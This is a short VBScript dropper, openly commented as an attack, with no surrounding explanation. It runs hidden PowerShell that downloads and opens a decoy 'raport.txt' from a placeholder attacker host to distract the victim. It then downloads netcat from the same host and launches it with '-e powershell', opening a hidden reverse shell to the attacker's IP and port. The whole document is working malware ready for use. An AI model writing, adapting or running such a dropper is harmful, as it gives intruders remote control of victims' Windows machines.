Set objShell = CreateObject("Wscript.Shell")

' Download fake report
downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER IP>/raport.txt', '%TEMP%\raport.txt')"""
objShell.Run downloadRaport, 0, True

' Open report.txt
objShell.Run "cmd /c start """" %TEMP%\raport.txt", 0, True

' Download netcat from attacker IP
downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER IP>/nc64.exe', '%TEMP%\nc64.exe')"""
objShell.Run downloadCmd, 0, True

' Start reverse shell
execCmd = "cmd /c powershell -Command ""Start-Process \""%TEMP%\nc64.exe\"" -ArgumentList '<ATTACKER IP>', '<PORT>', '-e', 'powershell' -WindowStyle Hidden"""
objShell.Run execCmd, 0, True

Set objShell = Nothing
